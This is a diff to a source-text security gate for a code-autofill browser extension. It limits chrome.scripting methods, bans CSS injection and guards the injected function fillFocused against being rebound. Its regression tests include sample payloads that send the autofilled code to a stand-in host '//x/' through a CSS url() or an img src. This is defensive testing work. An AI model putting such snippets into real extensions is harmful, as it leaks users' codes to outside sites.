@@ -16,14 +16,16 @@
 // a tab or a window is left to one file, lib/nav.js, which opens only this extension's own popup
 // views and is pinned by sha256; everywhere else chrome.windows is refused and chrome.tabs may
 // only be read. Injecting into web pages (chrome.scripting) is left to lib/autofill-worker.js,
-// and asking for, enumerating or giving up host access (chrome.permissions) to that worker and
+// through the chrome.scripting methods in MANIFEST_POLICY.scriptingMethods only (no CSS), and
+// asking for, enumerating or giving up host access (chrome.permissions) to that worker and
 // the popup's bind view. The content script that runs in web pages (lib/fieldfind.js and
 // content/autofill.js) is not covered by the extension-page CSP; it is held to the same source
 // rules as every other file and to a default-deny list of what it may touch (rule
 // `content-script-sinks`: MANIFEST_POLICY.contentScriptFiles and the lists beside it), and the
 // worker's script registration may name no other file. The worker's injected functions
-// (injectedFunctions, run in the page by executeScript) are held to the same lists, and nothing
-// else may be injected.
+// (injectedFunctions, run in the page by executeScript) are held to the same lists, each is one
+// top-level declaration whose name nothing else in the file binds, assigns or shadows, and
+// nothing else may be injected.
 // The gate reads source text; it is a tripwire for the repository's own sources, not a
 // JavaScript parser or a sandbox. The end-to-end test is what observes the pages a browser opens.
 
@@ -87,11 +89,26 @@ const MANIFEST_POLICY = Object.freeze({
   // The only files (paths inside the extension) that may name chrome.scripting at all; any
   // reference elsewhere fails the `scripting-api` rule.
   scriptingFiles: ['lib/autofill-worker.js'],
+  // The only chrome.scripting methods a scripting file may name: running an injected function
+  // and keeping the content script's registration. insertCSS, removeCSS and every other member,
+  // and chrome.scripting without a member (an alias, a computed access), fail the
+  // `scripting-api` rule.
+  scriptingMethods: [
+    'executeScript', 'registerContentScripts', 'updateContentScripts', 'unregisterContentScripts',
+    'getRegisteredContentScripts',
+  ],
   // The only functions a scripting file may inject into a page (executeScript with func: <name>).
-  // Each must be declared once as function <name>(...) { ... } in a scripting file, and its text
-  // is held to the content-script lists below, since it runs in the page as the content script
-  // does. A scripting file may not name `files` at all (executeScript or insertCSS with files).
+  // Each must be declared once, at the top level, as function <name>(...) { ... } in a scripting
+  // file, and the name may appear nowhere else in the file but as func: <name> (no assignment,
+  // second binding or shadowing parameter or local, which would make func: inject other code).
+  // Its text is held to the content-script lists below, since it runs in the page as the content
+  // script does. A scripting file may not name `files` or `css` at all (no files injected, no CSS
+  // injected or registered).
   injectedFunctions: ['fillFocused'],
+  // The reads an injected function may make on top of the content-script lists, written as
+  // <global>.<member> with the global named bare, and only as reads (a write fails): fillFocused
+  // checks that the frame is still on the origin the menu was opened on before it writes.
+  injectedReads: ['location.origin'],
   // The only files that may use chrome.permissions freely: the worker (reconciles grants with
   // bindings, so it is what gives up a site's access once its binding is removed) and the popup's
   // bind view (asks for exactly one site, in the click on Allow).
@@ -415,19 +432,33 @@ function navigationHits(text, label, rel) {
 // chrome.scripting outside MANIFEST_POLICY.scriptingFiles, and chrome.permissions outside
 // MANIFEST_POLICY.permissionsFiles other than the members in permissionsMembersAnywhere.
 // Like the chrome.tabs check, any reference counts, not only a call, and a reference without a
-// member (an alias, a computed access) is refused. → { scripting: [hit], permissions: [hit] }
+// member (an alias, a computed access) is refused. Inside scriptingFiles only the methods in
+// scriptingMethods may be named: a named member is checked here, on the raw text (comments
+// included), and chrome.scripting without a member on the file's tokens (so a comment that
+// mentions chrome.scripting does not count). → { scripting: [hit], permissions: [hit] }
 function scopedApiHits(text, label, rel) {
   const hits = { scripting: [], permissions: [] };
+  const { scriptingFiles, scriptingMethods } = MANIFEST_POLICY;
   SCOPED_APIS.lastIndex = 0;
   for (const m of text.matchAll(SCOPED_APIS)) {
     const [, area, member] = m;
     const where = `${label}:${lineOf(text, m.index)}`;
     const shown = member ? `chrome.${area}.${member}` : `chrome.${area} (alias or computed access)`;
     if (area === 'scripting') {
-      if (!MANIFEST_POLICY.scriptingFiles.includes(rel)) hits.scripting.push(`${where} ${shown} outside ${MANIFEST_POLICY.scriptingFiles.join(', ')}`);
+      if (!scriptingFiles.includes(rel)) hits.scripting.push(`${where} ${shown} outside ${scriptingFiles.join(', ')}`);
+      else if (member && !scriptingMethods.includes(member)) hits.scripting.push(`${where} ${shown} is not one of scriptingMethods (${scriptingMethods.join(', ')})`);
     } else if (!MANIFEST_POLICY.permissionsFiles.includes(rel) && !(member && MANIFEST_POLICY.permissionsMembersAnywhere.includes(member))) {
       hits.permissions.push(`${where} ${shown} outside ${MANIFEST_POLICY.permissionsFiles.join(', ')}`);
     }
+  }
+  if (scriptingFiles.includes(rel)) {
+    const { tokens } = jsTokens(text);
+    tokens.forEach((tok, k) => {
+      if (tok.t !== 'id' || tok.v !== 'chrome' || !isDot(tokens[k + 1]) || tokens[k + 2]?.v !== 'scripting' || tokens[k + 2].t !== 'id') return;
+      if (!(isDot(tokens[k + 3]) && tokens[k + 4]?.t === 'id')) {
+        hits.scripting.push(`${label}:${lineOf(text, tok.i)} chrome.scripting used other than as chrome.scripting.<method> (alias or computed access)`);
+      }
+    });
   }
   return hits;
 }
@@ -442,7 +473,8 @@ function scopedApiHits(text, label, rel) {
 // a string key, computed calls, writes to a computed member (except into a const {} the file made
 // and binds nowhere else), object destructuring patterns, escaped identifiers, the bare globals in
 // BARE_CONTENT_SINKS, timers whose first argument is not a function, and strings that name a URL
-// sink are refused as well. The same checks apply to the text of each injected function.
+// sink are refused as well. The same checks apply to the text of each injected function, which
+// may also read what MANIFEST_POLICY.injectedReads lists (passed in as `reads`).
 // postMessage is refused in every form: the script runs in every frame of a bound origin, and the
 // frame's parent, top or opener may be another site, while the page itself already gets the code
 // through the field. window.name is refused for the same reason (it survives navigation to another
@@ -649,8 +681,9 @@ function opensComputedAccess(prev) {
   return prev.t === 'str' || prev.t === 're' || (prev.t === 'tpl' && !prev.open);
 }
 
-// What a content-script file uses outside MANIFEST_POLICY's content-script lists. → [hit]
-function contentScriptHits(text, label) {
+// What a content-script file uses outside MANIFEST_POLICY's content-script lists. `reads`:
+// <global>.<member> reads allowed on top of them (an injected function's injectedReads). → [hit]
+function contentScriptHits(text, label, { reads = [] } = {}) {
   const { contentScriptMembers, contentScriptConstructors, contentScriptChrome, contentScriptEvents } = MANIFEST_POLICY;
   const { tokens, problems } = jsTokens(text, { strict: true });
   const at = (tok) => `${label}:${lineOf(text, tok.i)}`;
@@ -732,7 +765,14 @@ function contentScriptHits(text, label) {
       continue;
     }
     if (isDot(tok) && next?.t === 'id') {
-      if (!judged.has(k + 1) && !contentScriptMembers.includes(next.v)) hits.push(`${at(tok)} .${next.v} is not on the content-script member list`);
+      // <global>.<member> from `reads`: the global named bare (not x.location), read only.
+      const read = prev?.t === 'id' && !isDot(tokens[k - 2]) && reads.includes(`${prev.v}.${next.v}`);
+      if (read) {
+        const after = tokens[k + 2];
+        const before = tokens[k - 2];
+        const writes = (after?.t === 'p' && (ASSIGNMENT_OPS.has(after.v) || after.v === '++' || after.v === '--')) || isPunct(before, '++') || isPunct(before, '--');
+        if (writes) hits.push(`${at(tok)} write to ${prev.v}.${next.v} (it may only be read)`);
+      } else if (!judged.has(k + 1) && !contentScriptMembers.includes(next.v)) hits.push(`${at(tok)} .${next.v} is not on the content-script member list`);
       judged.add(k + 1);
       continue;
     }
@@ -801,7 +841,10 @@ function contentScriptHits(text, label) {
 //   strings, or a const holding one that is used nowhere but as a `js:` value; anything else, and
 //   a file that registers content scripts without a readable `js:` key, is a hit.
 // - Injection: `func:` may name only one of injectedFunctions; each of those found here
-//   (function <name>(...) { ... }) is held to contentScriptHits; `files` may not appear at all.
+//   (function <name>(...) { ... }) is held to contentScriptHits, must be declared at the top level,
+//   and its name may stand nowhere else but as a func: value (any other unqualified use, such as
+//   an assignment, a second binding or a shadowing parameter or local, is a hit); `files` and
+//   `css` may not appear at all.
 // → { hits: [hit], named: [path], injected: Map(name -> times declared) }
 function scriptingFileHits(text, label) {
   const { tokens, problems } = jsTokens(text);
@@ -868,8 +911,25 @@ function scriptingFileHits(text, label) {
 
   // Injection. A function passed as func: is serialized and run in the page, so its text is held
   // to the content-script lists: everything before it is blanked (newlines kept, so lines match).
-  const { injectedFunctions } = MANIFEST_POLICY;
+  const { injectedFunctions, injectedReads } = MANIFEST_POLICY;
   const injected = new Map(injectedFunctions.map((name) => [name, 0]));
+  // Bracket depth before each token; a top-level declaration stands at depth 0 at the start of a
+  // statement (the file's start, or after ';' or '}'), optionally after export and async.
+  const depth = [];
+  let d = 0;
+  for (const tok of tokens) {
+    if (tok.t === 'p' && (tok.v === ')' || tok.v === ']' || tok.v === '}')) d -= 1;
+    depth.push(d);
+    if (tok.t === 'p' && (tok.v === '(' || tok.v === '[' || tok.v === '{')) d += 1;
+  }
+  const topLevel = (k) => {
+    let j = k - 1;
+    if (tokens[j]?.t === 'id' && tokens[j].v === 'async') j -= 1;
+    if (tokens[j]?.t === 'id' && tokens[j].v === 'export') j -= 1;
+    return depth[k] === 0 && (j < 0 || isPunct(tokens[j], ';') || isPunct(tokens[j], '}'));
+  };
+  // Token indices where an injected function's name may stand: its declaration and func: values.
+  const allowedUse = new Set();
   tokens.forEach((tok, k) => {
     const name = tokens[k + 1];
     if (tok.t !== 'id' || tok.v !== 'function' || name?.t !== 'id' || !injected.has(name.v) || !isPunct(tokens[k + 2], '(')) return;
@@ -877,13 +937,19 @@ function scriptingFileHits(text, label) {
     const brace = paren >= 0 && isPunct(tokens[paren + 1], '{') ? closingToken(tokens, paren + 1) : -1;
     if (brace < 0) return;
     injected.set(name.v, injected.get(name.v) + 1);
+    allowedUse.add(k + 1);
+    if (!topLevel(k)) hits.push(`${at(name)} function ${name.v} is not a top-level function declaration (a nested or expression one is not what func: ${name.v} names)`);
     const start = tokens[k - 1]?.v === 'async' ? tokens[k - 1].i : tok.i;
     const body = text.slice(0, start).replace(/[^\n]/g, ' ') + text.slice(start, tokens[brace].i + 1);
-    hits.push(...contentScriptHits(body, label).map((hit) => `${hit} (in injected ${name.v})`));
+    hits.push(...contentScriptHits(body, label, { reads: injectedReads }).map((hit) => `${hit} (in injected ${name.v})`));
   });
   tokens.forEach((tok, k) => {
     if ((tok.t === 'id' || tok.t === 'str') && tok.v === 'files') {
-      hits.push(`${at(tok)} files in a scripting file (executeScript and insertCSS may inject only func: ${injectedFunctions.join(', ')})`);
+      hits.push(`${at(tok)} files in a scripting file (executeScript may inject only func: ${injectedFunctions.join(', ')})`);
+      return;
+    }
+    if ((tok.t === 'id' || tok.t === 'str') && tok.v === 'css') {
+      hits.push(`${at(tok)} css in a scripting file (no CSS is injected or registered)`);
       return;
     }
     if (!((tok.t === 'id' && !isDot(tokens[k - 1])) || tok.t === 'str') || tok.v !== 'func') {
@@ -895,7 +961,14 @@ function scriptingFileHits(text, label) {
     if (!isKey) hits.push(`${at(tok)} func named other than as the func: key of an injection`);
     else if (!(value?.t === 'id' && injected.has(value.v) && (isPunct(tokens[k + 3], ',') || isPunct(tokens[k + 3], '}')))) {
       hits.push(`${at(tok)} func: ${value?.v ?? ''} is not one of injectedFunctions (${injectedFunctions.join(', ')})`);
-    }
+    } else allowedUse.add(k + 2);
+  });
+  // Anywhere else an unqualified injected name could rebind what func: serializes (an
+  // assignment, var/let/const/class/import, a parameter, a destructuring target, a nested
+  // declaration). A text scan cannot list every binding form, so every other use is refused.
+  tokens.forEach((tok, k) => {
+    if (tok.t !== 'id' || !injected.has(tok.v) || isDot(tokens[k - 1]) || allowedUse.has(k)) return;
+    hits.push(`${at(tok)} ${tok.v} named other than in its one top-level declaration and as func: ${tok.v} (an assignment, another binding or a shadowing local would inject other code)`);
   });
   return { hits, named, injected };
 }
@@ -1155,7 +1228,9 @@ function runChecks(extDir) {
   record(
     'scripting-api',
     scripting.length === 0,
-    scripting.length === 0 ? `chrome.scripting only in ${MANIFEST_POLICY.scriptingFiles.join(', ')} (${scope})` : scripting.join('; '),
+    scripting.length === 0
+      ? `chrome.scripting only in ${MANIFEST_POLICY.scriptingFiles.join(', ')} (${scope}), only chrome.scripting.{${MANIFEST_POLICY.scriptingMethods.join(', ')}}`
+      : scripting.join('; '),
   );
   record(
     'permissions-api',
@@ -1193,7 +1268,7 @@ function runChecks(extDir) {
     'content-script-sinks',
     contentHits.length === 0,
     contentHits.length === 0
-      ? `${MANIFEST_POLICY.contentScriptFiles.join(', ')} use only the content-script members, new {${MANIFEST_POLICY.contentScriptConstructors.join(', ')}} and chrome.{${MANIFEST_POLICY.contentScriptChrome.join(', ')}}; registrations in ${MANIFEST_POLICY.scriptingFiles.join(', ')} name js: [${registered.join(', ')}]; injected func: [${MANIFEST_POLICY.injectedFunctions.join(', ')}] held to the same lists, no files`
+      ? `${MANIFEST_POLICY.contentScriptFiles.join(', ')} use only the content-script members, new {${MANIFEST_POLICY.contentScriptConstructors.join(', ')}} and chrome.{${MANIFEST_POLICY.contentScriptChrome.join(', ')}}; registrations in ${MANIFEST_POLICY.scriptingFiles.join(', ')} name js: [${registered.join(', ')}]; injected func: [${MANIFEST_POLICY.injectedFunctions.join(', ')}] held to the same lists (plus reads of ${MANIFEST_POLICY.injectedReads.join(', ')}), each one top-level declaration named nowhere else, no files or css`
       : contentHits.join('; '),
   );
   record('inline-script', inline.length === 0, inline.length === 0 ? `no inline <script> or on*= in ${htmlCount} .html files` : inline.join('; '));
@@ -1259,7 +1334,12 @@ const PINNED_POLICY = {
   navWrapperSha256: 'b0f323da96fc1cad5cbd0e15d64d7caf2c279bf29902c2a7112bd65fcb945822',
   tabsMethodsOutsideNav: ['captureVisibleTab', 'getCurrent'],
   scriptingFiles: ['lib/autofill-worker.js'],
+  scriptingMethods: [
+    'unregisterContentScripts', 'updateContentScripts', 'registerContentScripts', 'getRegisteredContentScripts',
+    'executeScript',
+  ],
   injectedFunctions: ['fillFocused'],
+  injectedReads: ['location.origin'],
   permissionsFiles: ['popup/popup.js', 'lib/autofill-worker.js'],
   permissionsMembersAnywhere: ['onAdded', 'onRemoved', 'contains'],
   contentScriptFiles: ['content/autofill.js', 'lib/fieldfind.js'],
@@ -1321,8 +1401,12 @@ const PIN_MUTATIONS = [
   ['tabsMethodsOutsideNav', (p) => p.tabsMethodsOutsideNav.push('create')],
   ['scriptingFiles', (p) => p.scriptingFiles.push('background.js')],
   ['scriptingFiles', (p) => (p.scriptingFiles = ['popup/popup.js'])],
+  ['scriptingMethods', (p) => p.scriptingMethods.push('insertCSS')],
+  ['scriptingMethods', (p) => (p.scriptingMethods = p.scriptingMethods.filter((m) => m !== 'executeScript'))],
   ['injectedFunctions', (p) => p.injectedFunctions.push('fillAll')],
   ['injectedFunctions', (p) => (p.injectedFunctions = [])],
+  ['injectedReads', (p) => p.injectedReads.push('location.href')],
+  ['injectedReads', (p) => p.injectedReads.push('document.cookie')],
   ['permissionsFiles', (p) => p.permissionsFiles.push('popup/settings.js')],
   ['permissionsFiles', (p) => p.permissionsFiles.pop()],
   ['permissionsMembersAnywhere', (p) => p.permissionsMembersAnywhere.push('request')],
@@ -2205,7 +2289,81 @@ const CASES = [
   ['injected-func-shorthand', editWorker('func: fillFocused', 'func'), ['content-script-sinks'], /func named other than as the func: key/],
   ['injected-func-member', appendJs('lib/autofill-worker.js', 'export function widen(options) { options.func = grabPage; }\n'), ['content-script-sinks'], /\.func \(an injection is written/],
   ['injected-executescript-files', appendJs('lib/autofill-worker.js', "export const inject = (tabId) => chrome.scripting.executeScript({ target: { tabId }, files: ['content/autofill.js'] });\n"), ['content-script-sinks'], /files in a scripting file/],
-  ['injected-insertcss-files', appendJs('lib/autofill-worker.js', "export const style = (tabId) => chrome.scripting.insertCSS({ target: { tabId }, files: ['popup/popup.css'] });\n"), ['content-script-sinks'], /files in a scripting file/],
+  ['injected-insertcss-files', appendJs('lib/autofill-worker.js', "export const style = (tabId) => chrome.scripting.insertCSS({ target: { tabId }, files: ['popup/popup.css'] });\n"), ['scripting-api', 'content-script-sinks'], /files in a scripting file/],
+  // Only the chrome.scripting methods in scriptingMethods, even in the worker: CSS written into a
+  // page can load a URL that carries the code (the reviewer's inline-css mutation), so neither
+  // insertCSS nor a css: key passes.
+  [
+    'scripting-insertcss-inline',
+    appendJs('lib/autofill-worker.js', "export const style = (tabId, code) => chrome.scripting.insertCSS({ target:{tabId}, css: 'body{background-image:url(//x/?c='+code+')}' });\n"),
+    ['scripting-api', 'content-script-sinks'],
+    /chrome\.scripting\.insertCSS is not one of scriptingMethods/,
+  ],
+  ['scripting-removecss', appendJs('lib/autofill-worker.js', 'export const unstyle = (o) => chrome.scripting.removeCSS(o);\n'), ['scripting-api'], /chrome\.scripting\.removeCSS is not one of scriptingMethods/],
+  ['scripting-other-method-optional-chain', appendJs('lib/autofill-worker.js', 'export const style = (o) => chrome?.scripting?.insertCSS(o);\n'), ['scripting-api'], /insertCSS is not one of scriptingMethods/],
+  ['scripting-alias-in-worker', appendJs('lib/autofill-worker.js', 'const s = chrome.scripting;\nexport const style = (o) => s.insertCSS(o);\n'), ['scripting-api'], /chrome\.scripting used other than as chrome\.scripting\.<method>/],
+  ['scripting-computed-in-worker', appendJs('lib/autofill-worker.js', "export const style = (o) => chrome.scripting['insertCSS'](o);\n"), ['scripting-api'], /chrome\.scripting used other than as chrome\.scripting\.<method>/],
+  ['scripting-destructure-in-worker', appendJs('lib/autofill-worker.js', 'const { insertCSS } = chrome.scripting;\n'), ['scripting-api'], /chrome\.scripting used other than/],
+  ['scripting-css-key-in-registration', editWorker('js: CONTENT_SCRIPTS', "js: CONTENT_SCRIPTS, css: ['popup/popup.css']"), ['content-script-sinks'], /css in a scripting file/],
+  ['scripting-css-member-in-worker', appendJs('lib/autofill-worker.js', "export function widen(script) { script.css = ['popup/popup.css']; }\n"), ['content-script-sinks'], /css in a scripting file/],
+  // A worker comment may name chrome.scripting without a method (the real one does).
+  ['ok-scripting-bare-in-worker-comment', editWorker('// Context menu, codes for bound sites, script registration.', '// Context menu, codes for bound sites; fillFocused() is serialized by chrome.scripting and runs in the frame.'), []],
+  // The injected function is the one top-level declaration of its name; nothing else in the file
+  // may assign, redeclare or shadow it, or func: would serialize other code.
+  [
+    'injected-reassigned',
+    appendJs('lib/autofill-worker.js', "fillFocused = (code) => { document.querySelector('img').src = '//x/?c=' + code; };\n"),
+    ['content-script-sinks'],
+    /fillFocused named other than in its one top-level declaration/,
+  ],
+  ['injected-compound-assigned', appendJs('lib/autofill-worker.js', 'fillFocused ||= grab;\n'), ['content-script-sinks'], /fillFocused named other than/],
+  ['injected-redeclared-var', appendJs('lib/autofill-worker.js', 'var fillFocused = grab;\n'), ['content-script-sinks'], /fillFocused named other than/],
+  ['injected-redeclared-let', appendJs('lib/autofill-worker.js', 'let fillFocused = grab;\n'), ['content-script-sinks'], /fillFocused named other than/],
+  ['injected-redeclared-const-list', appendJs('lib/autofill-worker.js', 'const other = 1, fillFocused = grab;\n'), ['content-script-sinks'], /fillFocused named other than/],
+  ['injected-redeclared-class', appendJs('lib/autofill-worker.js', 'class fillFocused {}\n'), ['content-script-sinks'], /fillFocused named other than/],
+  ['injected-redeclared-import', editWorker("import { openOwnWindow } from './nav.js';", "import { openOwnWindow, openOwnWindow as fillFocused } from './nav.js';"), ['content-script-sinks'], /fillFocused named other than/],
+  ['injected-destructured-rebind', appendJs('lib/autofill-worker.js', '[fillFocused] = [grab];\n'), ['content-script-sinks'], /fillFocused named other than/],
+  ['injected-shadowed-param', editWorker('export async function handleMenuClick(info, tab) {', 'export async function handleMenuClick(info, tab, fillFocused = grab) {'), ['content-script-sinks'], /fillFocused named other than/],
+  [
+    'injected-shadowed-local',
+    editWorker('  const frameIds = [info.frameId ?? 0];', "  const frameIds = [info.frameId ?? 0];\n  const fillFocused = (code) => { document.querySelector('img').src = '//x/?c=' + code; };"),
+    ['content-script-sinks'],
+    /fillFocused named other than/,
+  ],
+  [
+    'injected-shadowed-nested-declaration',
+    editWorker('  const frameIds = [info.frameId ?? 0];', '  const frameIds = [info.frameId ?? 0];\n  function fillFocused(code) { return code; }'),
+    ['content-script-sinks'],
+    /function fillFocused is not a top-level function declaration/,
+  ],
+  ['injected-function-expression', editWorker('function fillFocused(code) {', 'const holder = function fillFocused(code) {'), ['content-script-sinks'], /function fillFocused is not a top-level function declaration/],
+  [
+    'injected-in-block',
+    (fx) => {
+      editWorker('function fillFocused(code) {', '{\nfunction fillFocused(code) {')(fx);
+      appendJs('lib/autofill-worker.js', '}\n')(fx);
+    },
+    ['content-script-sinks'],
+    /function fillFocused is not a top-level function declaration/,
+  ],
+  ['ok-injected-async-export', editWorker('function fillFocused(code) {', 'export async function fillFocused(code) {'), []],
+  ['ok-injected-name-as-member', appendJs('lib/autofill-worker.js', 'export const names = { list: [] };\nnames.fillFocused = 1;\n'), []],
+  // fillFocused may read location.origin (it checks the frame's origin before it writes); a write
+  // to it or to another part of location fails, and so does .origin anywhere else.
+  [
+    'ok-injected-location-origin-read',
+    (fx) => {
+      editWorker('function fillFocused(code) {', 'function fillFocused(code, expected) {\n  if (location.origin !== expected) return false;')(fx);
+      editWorker("args: ['123456'] }", "args: ['123456', info.frameId] }")(fx);
+    },
+    [],
+  ],
+  ['injected-location-href-write', editWorker('function fillFocused(code) {', "function fillFocused(code) {\n  location.href = '/next?c=' + code;"), ['navigation', 'content-script-sinks'], /\.href is not on the content-script member list \(in injected fillFocused\)/],
+  ['injected-location-origin-write', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  location.origin = code;'), ['content-script-sinks'], /write to location\.origin \(it may only be read\) \(in injected fillFocused\)/],
+  ['injected-location-origin-increment', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  ++location.origin;'), ['content-script-sinks'], /write to location\.origin/],
+  ['injected-origin-not-location', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  const here = el.origin;'), ['content-script-sinks'], /\.origin is not on the content-script member list \(in injected fillFocused\)/],
+  ['injected-window-location-origin', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  const here = window.location.origin;'), ['content-script-sinks'], /\.location is not on the content-script member list \(in injected fillFocused\)/],
+  ['content-location-origin', appendContent('const here = location.origin;\n'), ['content-script-sinks'], /\.origin is not on the content-script member list/],
 
   ['inline-script-body', addHtml('<script>document.title = 1;</script>'), ['inline-script']],
   [
